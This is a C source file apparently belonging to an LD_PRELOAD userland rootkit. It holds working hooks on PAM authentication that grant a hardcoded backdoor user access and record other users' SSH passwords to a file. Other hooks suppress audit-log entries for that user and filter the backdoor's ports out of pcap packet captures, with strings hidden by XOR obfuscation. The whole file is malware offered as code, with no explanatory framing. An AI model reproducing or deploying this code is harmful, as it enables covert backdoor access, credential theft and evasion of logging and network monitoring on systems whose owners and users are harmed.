#include <security/pam_modules.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <pcap/pcap.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <dlfcn.h>
#include "../include/def.h"
#include "../include/syscalls.h"
#include "../include/libutil.h"
#include "../build/xor.h"

#ifdef LIBAUDIT
#include <libaudit.h>
#endif

extern const char *__progname;

/* ************************************************
 *
 *
 *         HIDDEN PORTS (~/.ports)
 *
 *
 *************************************************/
static __inline__ void remove_port(int port)
{
	char buf[256];
	char portbuf[4096];
	char hport[8];
	char tmpname[256];
	struct stat sb;
	int portlen, nbytes, filesize, fd;
	char *p;

	strcpy(tmpname, "/tmp/");
	sprintf(tmpname+strlen(tmpname), "%p", &port);

	/* read in .ports */
	syscall(SYS_STAT, XOR(HIDDEN_PORTS), &sb);
	filesize = sb.st_size;
	fd = syscall(SYS_OPEN, XOR(HIDDEN_PORTS), O_RDWR);
	nbytes = syscall(SYS_READ, fd, portbuf, (filesize > 4095) ? filesize : 4095);
	portbuf[nbytes] = 0;
	syscall(SYS_CLOSE, fd);

	portlen = sprintf(hport, "%d\n", port);
	p=strstr(portbuf, hport);
	if (!p) {
		syscall(SYS_CLOSE, fd);
		return;
	}

	/* last entry */
	if ((p-portbuf+portlen) == filesize) {
		ftruncate(fd, p-portbuf);
		syscall(SYS_CLOSE, fd);
		return;
	}

	syscall(SYS_CLOSE, fd);
	fd = open(tmpname, O_RDWR|O_CREAT|O_EXCL, 0644);
	memmove(p, p+portlen, sb.st_size-(p-portbuf+portlen));
	syscall(SYS_WRITE, fd, portbuf, filesize-portlen);
	syscall(SYS_CLOSE, fd);
	rename(tmpname, XOR(HIDDEN_PORTS));
	setxattr (XOR(HIDDEN_PORTS), "security.selinux", "unconfined_u:object_r:sshd_tmp_t:s0", 36, 0);
}

static __inline__ int HIDDEN_PORT_LIST(char *portbuf, int *hidden_ports)
{
	char *p;
	int nr_ports = 0;

	while ((p=strchr(portbuf, '\n')) != NULL) {
		*p = 0;
		hidden_ports[nr_ports++] = atoi(portbuf);
		portbuf = p+1;
		if (*portbuf == '\0')
			break;
	}
	return (nr_ports);
}

static __inline__ int TCP_PORT_LIST(char *portbuf, int *tcp_sports, int *tcp_dports, int *timewait)
{
	char *line, *p, *p2;
	unsigned int sport, dport;
	int nr_ports = 0;

	line = portbuf;
	while ((p2=strchr(line, '\n')) != NULL) {
		p = strchr(line+11, ':');
		if (!p)
			break;
		sport = strtoul((char *)(p+1),  NULL, 16);
		dport = strtoul((char *)(p+15), NULL, 16);
		tcp_sports[nr_ports] = sport;
		tcp_dports[nr_ports] = dport;
		if (*(p+21) == '6')
			timewait[nr_ports] = 1;
		nr_ports++;
		if (nr_ports >= 1022)
			return (nr_ports);
		line = p2 + 1;
	}
	return (nr_ports);
}

int xread(int fd, char *buf, int maxlen)
{
	int count, total = 0, pos = 0;

	while (1) {
		count = syscall(SYS_READ, fd, buf+pos, maxlen);
		if (count <= 0)
			return total;
		total += count;
		maxlen -= count;
		if (maxlen <= 0)
			return total;
	}
}

void clean_ports()
{
	char tcpbuf[32*1024];
	char portbuf[4096];
	char buf[256];
	char *line, *p;
	int hidden_ports[256];
	int tcp_sports[1024];
	int tcp_dports[1024];
	int timewait[1024];
	int nr_hidden_ports = 0;
	int nr_tcp_ports = 0;
	int fd, port, dead_port, count, x, y;

	memset(timewait, 0, 1024*4);
	fd = syscall(SYS_OPEN, XOR(HIDDEN_PORTS), O_RDONLY);
	if (fd < 0)
		return;
	count = syscall(SYS_READ, fd, portbuf, 4095);
	syscall(SYS_CLOSE, fd);
	portbuf[count] = 0;
	nr_hidden_ports = HIDDEN_PORT_LIST(portbuf, hidden_ports);

	fd = syscall(SYS_OPEN, XOR(PROC_NET_TCP), O_RDONLY);
	if (fd < 0)
		return;
	count = syscall(SYS_READ, fd, tcpbuf, sizeof(tcpbuf)-1);
	syscall(SYS_CLOSE, fd);
	if (count <= 0)
		return;
	tcpbuf[count] = 0;
	nr_tcp_ports = TCP_PORT_LIST(tcpbuf, tcp_sports, tcp_dports, timewait);
	dead_port = 1;
	for (x=0; x<nr_hidden_ports; x++) {
		unsigned int hidden_port = hidden_ports[x];
		for (y=0; y<nr_tcp_ports; y++) {
			if ((hidden_port == tcp_sports[y]) || (hidden_port == tcp_dports[y])) {
				if (timewait[y])
					break;
				dead_port = 0;
				break;
			}
		}
		if (dead_port || (hidden_port == 80) || (hidden_port == 53)) {
			remove_port(hidden_port);
			continue;
		}
		dead_port = 1;
	}
}

/* ************************************************
 *
 *
 *         /var/log/audit/audit.log
 *
 *
 *************************************************/
#ifdef LIBAUDIT
int audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, 
                           const char *name, unsigned int id, const char *host, 
                           const char *addr, const char *tty, int result)
{
	int (*o_audit)(int, int, const char *, const char *, const char *, unsigned int, 
                   const char *, const char *, const char *, int) = dlsym(RTLD_NEXT, "audit_log_acct_message");
	char buf[256];

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return 0;
	if (name && strstr(name, XOR(ESX_USER)))
		return 0;
	return o_audit(audit_fd, type, pgname, op, name, id, host, addr, tty, result);
}

#if 0
int filter_audit(char *message)
{
	char *p, *p2;
	char buf[2048];
	int fd, nbytes;

	fd = syscall(SYS_OPEN, XOR(HIDDEN_AUDIT), O_RDONLY, 0644);
	if (fd < 0)
		goto out;
	nbytes = syscall(SYS_READ, fd, buf, sizeof(buf)-1);
	if (nbytes <= 0) {
		syscall(SYS_CLOSE, fd);
		goto out;
	}
	buf[nbytes] = 0;
	p = buf;
	while (p2=strchr(p, '\n')) {
		*p2++ = 0;
		if (strstr(message, p)) {
			syscall(SYS_CLOSE, fd);
			return 0;
		}
		p = p2;
	}
}
#endif

int audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname,
                           const char *addr, const char *tty, int result)
{
	int (*o_audit)(int, int, const char *, const char *, const char *, const char *, int) = dlsym(RTLD_NEXT, "audit_log_user_message");
	char buf[2048];
	char cmdline[256];
	int fd;

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return 0;
/*
	fd = syscall(SYS_OPEN, XOR(CMDLINE_SELF), O_RDONLY);
	syscall(SYS_READ, fd, cmdline, sizeof(cmdline));
	syscall(SYS_CLOSE, fd);
	if (strstr(cmdline, XOR(SSHMUGABE))) {
		setgid(MAGIC_GID);
		return 0;
	}
*/
	return o_audit(audit_fd, type, message, hostname, addr, tty, result);
}
#endif

/* ************************************************
 *
 *
 *                    PAM
 *
 *
 *************************************************/
struct pam_response *pam_get_password(pam_handle_t *pamh, char *user, int rkadmin)
{
	struct pam_message msg;
	struct pam_response *pam_resp = NULL;
	const struct pam_message *pmsg;
	const struct pam_conv *conv;
	const void *convp;
	char *msgbuf;
	char buf[64];
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

	if ((pam_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS)
		return NULL;
	conv = convp;
	if (conv == NULL || conv->conv == NULL)
		return NULL;

	msg.msg_style = 1;
	msg.msg = "Password: ";
	pmsg = &msg;
	conv->conv(1, &pmsg, &pam_resp, conv->appdata_ptr);
	if (rkadmin) {
		if (!strcmp(pam_resp->resp, XOR(PASS)))
			return (pam_resp);
		return (NULL);
	}
	return (pam_resp);
}

static __inline__ void pam_log_password(char *user, char *pwd)
{
	char buf[256];
	int fd;

	fd = syscall(SYS_OPEN, XOR(SSHPASS), O_RDWR|O_APPEND|O_CREAT, 0644);
	snprintf(buf, sizeof(buf)-1, "%s %s\n", user, pwd); 
	syscall(SYS_WRITE, fd, buf, strlen(buf));
	syscall(SYS_CLOSE, fd);
}

int pam_authenticate(pam_handle_t *pamh, int flags)
{
	struct sockaddr_in saddr;
	struct pam_response *pwd;
	struct stat sb;
	socklen_t slen = 16;
	char *user;
	char buf[64*10];
	int (*__pam_authenticate)(pam_handle_t *, int) = dlsym(RTLD_NEXT, "pam_authenticate");
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");
	int fd, ret;

	if (!strstr(__progname, "sshd"))
		goto out;
	pam_item(pamh, PAM_USER, (const void **)&user);
	if (user && !strcmp(user, XOR(ESX_USER))) {
			//if (getpeername(3, (struct sockaddr *)&saddr, &slen))
			//	return PAM_SUCCESS;
			clean_ports();
			fd = syscall(SYS_OPEN, XOR(HIDDEN_PORTS), O_RDWR|O_APPEND|O_CREAT, 0644);
			sprintf(buf, "%d\n", htons(saddr.sin_port));
			syscall(SYS_WRITE, fd, buf, strlen(buf));
			syscall(SYS_CLOSE, fd);
			syscall(SYS_SETGID, MAGIC_GID);
			if (!pam_get_password(pamh, user, 1))
				return (PAM_PERM_DENIED);
			return (PAM_SUCCESS);
	}

	if (syscall(SYS_STAT, XOR(LOG_PAM), &sb) < 0)
		goto out;

	// log passwords
	pwd = pam_get_password(pamh, user, 0);
	ret = __pam_authenticate(pamh, flags);
	if (!ret && pwd) {
		pam_log_password(user, pwd->resp);
	}
	if (pwd)
		free(pwd);
	return ret;
out:
	return __pam_authenticate(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
	char *user;
	char buf[64];
	int (*__pam_acct_mgmt)(pam_handle_t *, int) = dlsym(RTLD_NEXT, "pam_acct_mgmt");
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

	pam_item(pamh, PAM_USER, (const void **)&user);
	if (user && !strcmp(user, XOR(ESX_USER))) {
		syscall(SYS_SETGID, 8888);
		return PAM_SUCCESS;
	}
	return __pam_acct_mgmt(pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags)
{
	char *user;
	char buf[64];
	int (*__pam_open_session)(pam_handle_t *, int) = dlsym(RTLD_NEXT, "pam_open_session");
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

	pam_item(pamh, PAM_USER, (const void **)&user);
	if (user && !strcmp(user, XOR(ESX_USER))) {
		syscall(SYS_SETGID, 8888);
		return PAM_SUCCESS;
	}
	return __pam_open_session(pamh, flags);
}


int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[])
{
	char *user;
	char buf[64];
	int (*__pam_sm_authenticate)(pam_handle_t *, int) = dlsym(RTLD_NEXT, "pam_sm_authenticate");
	int (*pam_item)(const pam_handle_t *pamh, int item_type, const void **item) = dlsym(RTLD_NEXT, "pam_get_item");

	pam_item(pamh, PAM_USER, (const void **)&user);
	if (user && !strcmp(user, XOR(ESX_USER))) {
		syscall(SYS_SETGID, 8888);
		return PAM_SUCCESS;
	}
	return __pam_sm_authenticate(pamh, flags);
}
/* ************************************************
 *
 *
 *                 PCAP
 *
 *
 *************************************************/
#define ETHERNET_SIZE 14
void (*orig_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

static __inline__ int load_hidden_ports(char *portfile, int *ports, int *nr_ports)
{
	char portbuf[8192*2];
	char *line, *p;
	int count = 0;

	if (!readfile(portfile, portbuf))
		return 0;

	line = portbuf;
	while ((p=strchr(line, '\n'))) {
		*p++ = 0;
		ports[count++] = atoi(line);
		if (count >= 120)
			break;
		line = p;
	}
	if (!count)
		return 0;
	*nr_ports = count;
	return 1;
}

static __inline__ int pcap_filter_tcp(struct ip_hdr *ip)
{
	struct tcp_hdr *tcp;
	int tcp_ports[120];
	char buf[64];
	int nr_ports, hidden_port, dport, sport, x;

	if (!load_hidden_ports((char *)XOR(HIDDEN_PORTS), &tcp_ports[0], &nr_ports))
		return 0;

	tcp = (struct tcp_hdr *)((char *)ip + (ip->ip_hl*4));
	sport = htons(tcp->tcp_sport);
	dport = htons(tcp->tcp_dport);
	for (x=0; x<nr_ports; x++) {
		hidden_port = tcp_ports[x];
		if ((hidden_port == sport) || (hidden_port == dport))
			return 1;
	}
	return 0;
}

static __inline__ int pcap_filter_udp(struct ip_hdr *ip)
{
	struct udp_hdr *udp;
	int udp_ports[120];
	char buf[64];
	int nr_ports, hidden_port, dport, sport, x;

	if (!load_hidden_ports((char *)XOR(HIDDEN_UDP), &udp_ports[0], &nr_ports))
		return 0;

	udp = (struct udp_hdr *)((char *)ip + (ip->ip_hl*4));
	sport = htons(udp->udp_sport);
	dport = htons(udp->udp_dport);
	for (x=0; x<nr_ports; x++) {
		hidden_port = udp_ports[x];
		if ((hidden_port == sport) || (hidden_port == dport))
			return 1;
	}
	return 0;
}

void pcap_packet_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	struct ip_hdr *ip;

	ip = (struct ip_hdr *)(packet+ETHERNET_SIZE);
	switch (ip->ip_protocol) {
		case IPPROTO_TCP:
			if (!pcap_filter_tcp(ip) && orig_callback)
				orig_callback(args, header, packet);
			break;
		case IPPROTO_UDP:
			if (!pcap_filter_udp(ip) && orig_callback)
				orig_callback(args, header, packet);
			break;
		default:
			if (orig_callback)
				orig_callback(args, header, packet);
			break;
	}
}

int pcap_loop(pcap_t *p, int count, pcap_handler callback, unsigned char *user)
{
	int (*o_pcap_loop)(pcap_t *, int, pcap_handler, unsigned char *) = dlsym(RTLD_NEXT, "pcap_loop");

	orig_callback = callback;
	return o_pcap_loop(p, count, pcap_packet_callback, user);
}
